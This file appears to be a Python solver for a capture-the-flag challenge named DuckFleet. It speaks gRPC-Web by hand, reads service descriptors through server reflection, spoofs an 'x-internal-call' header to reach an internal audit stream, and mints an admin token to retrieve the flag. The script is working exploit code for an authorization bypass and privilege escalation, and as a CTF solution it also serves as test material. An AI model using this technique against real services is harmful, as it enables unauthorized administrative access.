#!/usr/bin/env python3
"""DuckFleet solver.

Walks the full chain against a running instance using a hand-rolled
gRPC-Web client (raw HTTP + frames, text mode). Descriptors are recovered
dynamically from the server reflection responses; no .proto files needed.

Usage:
    pip install protobuf
    python3 solve.py [http://localhost:4000]
"""

import base64
import json
import socket
import struct
import sys
import time
import urllib.error
import urllib.request
from urllib.parse import unquote

from google.protobuf import descriptor_pb2, descriptor_pool, message_factory

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:4000"
EMAIL = "dispatch@duckurity.example"
PASSWORD = "fleetflow-2024"

CT_TEXT = "application/grpc-web-text+proto"


def frame(payload: bytes) -> bytes:
    return b"\x00" + struct.pack(">I", len(payload)) + payload


def parse_trailer(text: str):
    status, message = None, ""
    for line in text.split("\r\n"):
        if ":" not in line:
            continue
        key, value = line.split(":", 1)
        key = key.strip().lower()
        value = value.strip()
        if key == "grpc-status":
            status = int(value)
        elif key == "grpc-message":
            message = unquote(value)
    return status, message


def parse_frames(buf: bytes):
    messages, trailer = [], (None, "")
    pos = 0
    while pos < len(buf):
        flag = buf[pos]
        (length,) = struct.unpack(">I", buf[pos + 1 : pos + 5])
        payload = buf[pos + 5 : pos + 5 + length]
        if len(payload) != length:
            raise ValueError("truncated frame")
        if flag == 0x00:
            messages.append(payload)
        elif flag == 0x80:
            trailer = parse_trailer(payload.decode("utf-8", "replace"))
        else:
            raise ValueError(f"unknown frame type {flag:#x}")
        pos += 5 + length
    return messages, trailer


def unary(method, payload: bytes, token=None, extra_headers=None):
    body = base64.b64encode(frame(payload)).decode("ascii")
    headers = {"Content-Type": CT_TEXT}
    if token:
        headers["Authorization"] = "Bearer " + token
    for key, value in (extra_headers or {}).items():
        headers[key] = value
    req = urllib.request.Request(
        BASE + "/api/grpc/" + method, data=body.encode("ascii"), headers=headers, method="POST"
    )
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            raw = base64.b64decode(resp.read())
            resp_headers = dict(resp.headers.items())
    except urllib.error.HTTPError as exc:
        raise RuntimeError(f"{method} HTTP {exc.code}: {exc.read()[:200]!r}")
    messages, (status, message) = parse_frames(raw)
    return messages, status, message, resp_headers


def read_varint(buf: bytes, pos: int):
    result, shift = 0, 0
    while True:
        byte = buf[pos]
        pos += 1
        result |= (byte & 0x7F) << shift
        if not byte & 0x80:
            return result, pos
        shift += 7


def parse_fields(buf: bytes):
    fields = []
    pos = 0
    while pos < len(buf):
        tag, pos = read_varint(buf, pos)
        number, wire = tag >> 3, tag & 0x07
        if wire == 0:
            value, pos = read_varint(buf, pos)
        elif wire == 2:
            length, pos = read_varint(buf, pos)
            value = buf[pos : pos + length]
            pos += length
        elif wire == 1:
            value = buf[pos : pos + 8]
            pos += 8
        elif wire == 5:
            value = buf[pos : pos + 4]
            pos += 4
        else:
            raise ValueError(f"unsupported wire type {wire}")
        fields.append((number, wire, value))
    return fields


def reflection_request(field_number: int, value: bytes) -> bytes:
    out = b"\x0a\x06solver"  # ServerReflectionRequest.host = "solver"
    out += bytes([(field_number << 3) | 2, len(value)]) + value
    return out


def reflection_call(payload: bytes):
    messages, status, message, _ = unary(
        "grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo", payload
    )
    if status != 0:
        raise RuntimeError(f"reflection failed: {status} {message}")
    if not messages:
        raise RuntimeError("reflection returned no messages")
    return messages[0]


def list_services():
    raw = reflection_call(reflection_request(6, b""))
    services = []
    for number, wire, value in parse_fields(raw):
        if number == 5 and wire == 2:
            for s_number, s_wire, s_value in parse_fields(value):
                if s_number == 1 and s_wire == 2:
                    for n_number, n_wire, n_value in parse_fields(s_value):
                        if n_number == 1 and n_wire == 2:
                            services.append(n_value.decode())
    return services


def file_descriptors(symbol=None, filename=None):
    if symbol is not None:
        raw = reflection_call(reflection_request(3, symbol.encode()))
    else:
        raw = reflection_call(reflection_request(2, filename.encode()))
    descriptors = []
    for number, wire, value in parse_fields(raw):
        if number == 3 and wire == 2:
            for f_number, f_wire, f_value in parse_fields(value):
                if f_number == 1 and f_wire == 2:
                    descriptors.append(bytes(f_value))
        elif number == 6 and wire == 2:
            code, text = None, ""
            for e_number, e_wire, e_value in parse_fields(value):
                if e_number == 1 and e_wire == 0:
                    code = e_value
                elif e_number == 2 and e_wire == 2:
                    text = bytes(e_value).decode()
            raise RuntimeError(f"reflection error {code}: {text}")
    return descriptors


def build_pool(symbols):
    collected = {}
    for symbol in symbols:
        for blob in file_descriptors(symbol=symbol):
            fdp = descriptor_pb2.FileDescriptorProto()
            fdp.ParseFromString(blob)
            collected[fdp.name] = fdp
    pool = descriptor_pool.DescriptorPool()
    pending = dict(collected)
    added = set()
    while pending:
        progressed = False
        for name, fdp in list(pending.items()):
            if all(dep in added for dep in fdp.dependency):
                pool.Add(fdp)
                added.add(name)
                del pending[name]
                progressed = True
        if not progressed:
            raise RuntimeError(f"unresolvable descriptor dependencies: {list(pending)}")
    return pool


def msg_class(pool, full_name):
    return message_factory.GetMessageClass(pool.FindMessageTypeByName(full_name))


def jwt_role(token: str) -> str:
    payload = token.split(".")[1]
    payload += "=" * (-len(payload) % 4)
    return json.loads(base64.urlsafe_b64decode(payload).decode())["role"]


def subscribe(payload: bytes, token, extra_headers, observe_seconds, stop_when_admin=False):
    body = base64.b64encode(frame(payload)).decode("ascii")
    headers = {"Content-Type": CT_TEXT, "Connection": "close"}
    if token:
        headers["Authorization"] = "Bearer " + token
    for key, value in (extra_headers or {}).items():
        headers[key] = value
    req = urllib.request.Request(
        BASE + "/api/grpc/events.EventService/Subscribe",
        data=body.encode("ascii"),
        headers=headers,
        method="POST",
    )
    resp = urllib.request.urlopen(req, timeout=observe_seconds + 15)
    resp_headers = {k.lower(): v for k, v in resp.headers.items()}
    deadline = time.monotonic() + observe_seconds
    b64buf = ""
    binbuf = b""
    events = []
    admin_id = None
    trailer = (None, "")
    try:
        while time.monotonic() < deadline:
            try:
                # Single-byte reads: the HTTP layer buffers aggressively, so a
                # large read() would block until its buffer fills or the socket
                # times out. One byte at a time returns as soon as data flows.
                chunk = resp.read(1)
            except (socket.timeout, TimeoutError):
                break
            if not chunk:
                break
            try:
                b64buf += chunk.decode("ascii")
            except UnicodeDecodeError:
                break
            take = (len(b64buf) // 4) * 4
            if take:
                binbuf += base64.b64decode(b64buf[:take])
                b64buf = b64buf[take:]
            while len(binbuf) >= 5:
                (length,) = struct.unpack(">I", binbuf[1:5])
                if len(binbuf) < 5 + length:
                    break
                flag, payload_bytes = binbuf[0], binbuf[5 : 5 + length]
                binbuf = binbuf[5 + length :]
                if flag == 0x00:
                    events.append(payload_bytes)
                    if stop_when_admin:
                        marker = b"ops-admin@duckurity.example"
                        if marker in payload_bytes:
                            admin_id = payload_bytes
                            break
                elif flag == 0x80:
                    trailer = parse_trailer(payload_bytes.decode("utf-8", "replace"))
            if stop_when_admin and admin_id is not None:
                break
    finally:
        try:
            resp.close()
        except Exception:
            pass
    return resp_headers, events, admin_id, trailer


def main():
    print(f"[*] target: {BASE}")

    print("[3] discovering services via reflection ...")
    services = list_services()
    print(f"    services: {', '.join(services)}")
    pool = build_pool(services)
    LoginRequest = msg_class(pool, "auth.LoginRequest")
    LoginResponse = msg_class(pool, "auth.LoginResponse")
    UserInfo = msg_class(pool, "auth.UserInfo")
    Empty = msg_class(pool, "google.protobuf.Empty")
    SubscribeRequest = msg_class(pool, "events.SubscribeRequest")
    PlatformEvent = msg_class(pool, "events.PlatformEvent")
    SessionAudit = msg_class(pool, "events.SessionAudit")
    IssueTokenRequest = msg_class(pool, "admin.IssueTokenRequest")
    IssueTokenResponse = msg_class(pool, "admin.IssueTokenResponse")
    FlagResponse = msg_class(pool, "admin.FlagResponse")
    print("    descriptors recovered for auth, fleet, events, admin")

    print("[1] login as dispatch ...")
    login = LoginRequest(email=EMAIL, password=PASSWORD)
    messages, status, message, _ = unary("auth.AuthService/Login", login.SerializeToString())
    assert status == 0, f"login failed: {status} {message}"
    user_token = LoginResponse.FromString(messages[0]).token
    print(f"    USER token acquired (role={jwt_role(user_token)})")

    print("[2] WhoAmI ...")
    messages, status, message, _ = unary(
        "auth.AuthService/WhoAmI", Empty().SerializeToString(), token=user_token
    )
    assert status == 0, f"whoami failed: {status} {message}"
    me = UserInfo.FromString(messages[0])
    print(f"    {me.email} / {me.display_name} / role={me.role} / id={me.user_id}")

    print("[4] GetFlag with USER token (expected dead end) ...")
    messages, status, message, _ = unary(
        "admin.AdminService/GetFlag", Empty().SerializeToString(), token=user_token
    )
    print(f"    grpc-status: {status} grpc-message: {message}")
    assert status == 7, "expected PERMISSION_DENIED for standard user"

    print("[5] Subscribe AUDIT without internal header (observe ~35s) ...")
    sub = SubscribeRequest(categories=[1, 2])
    headers, events, _, trailer = subscribe(
        sub.SerializeToString(), user_token, None, observe_seconds=35
    )
    cats = [PlatformEvent.FromString(e).category for e in events]
    print(f"    x-acl: {headers.get('x-acl')} trailer: {trailer} events: {len(events)}")
    assert headers.get("x-acl") == "public", "expected silent downgrade to public"
    assert cats and all(c == 0 for c in cats), f"expected only FLEET events, got {set(cats)}"

    print("[6] Subscribe AUDIT with x-internal-call (observe up to ~35s) ...")
    headers, events, blob, _ = subscribe(
        sub.SerializeToString(),
        user_token,
        {"x-internal-call": "true"},
        observe_seconds=35,
        stop_when_admin=True,
    )
    print(f"    x-acl: {headers.get('x-acl')} events so far: {len(events)}")
    assert headers.get("x-acl") == "internal", "expected internal feed"
    assert blob is not None, "admin audit event not observed in time"
    admin_audit = None
    for raw in events:
        event = PlatformEvent.FromString(raw)
        if event.category == 1 and b"ops-admin@duckurity.example" in event.payload:
            admin_audit = SessionAudit.FromString(event.payload)
            break
    assert admin_audit is not None
    print(f"    admin: {admin_audit.email} id={admin_audit.user_id} action={admin_audit.action}")

    print("[7] IssueToken for own id (sanity check) ...")
    req = IssueTokenRequest(user_id=me.user_id)
    messages, status, message, _ = unary(
        "admin.AdminService/IssueToken",
        req.SerializeToString(),
        token=user_token,
        extra_headers={"x-internal-call": "true"},
    )
    assert status == 0, f"own IssueToken failed: {status} {message}"
    own_token = IssueTokenResponse.FromString(messages[0]).token
    print(f"    minted token role={jwt_role(own_token)} (still USER, as expected)")

    print("[8] IssueToken for admin id ...")
    req = IssueTokenRequest(user_id=admin_audit.user_id)
    messages, status, message, _ = unary(
        "admin.AdminService/IssueToken",
        req.SerializeToString(),
        token=user_token,
        extra_headers={"x-internal-call": "true"},
    )
    assert status == 0, f"admin IssueToken failed: {status} {message}"
    admin_token = IssueTokenResponse.FromString(messages[0]).token
    print(f"    minted token role={jwt_role(admin_token)}")

    print("[9] GetFlag with ADMIN token ...")
    messages, status, message, _ = unary(
        "admin.AdminService/GetFlag", Empty().SerializeToString(), token=admin_token
    )
    assert status == 0, f"GetFlag failed: {status} {message}"
    flag = FlagResponse.FromString(messages[0])
    print(f"    flag: {flag.flag} (issued_to={flag.issued_to})")


if __name__ == "__main__":
    main()
